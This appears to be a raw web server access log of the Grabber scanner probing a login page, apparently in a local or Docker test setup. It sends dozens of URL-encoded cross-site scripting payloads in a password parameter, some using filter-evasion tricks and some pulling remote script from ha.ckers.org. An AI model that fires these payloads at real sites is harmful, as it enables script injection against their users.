172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /?password=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:54 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:55 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
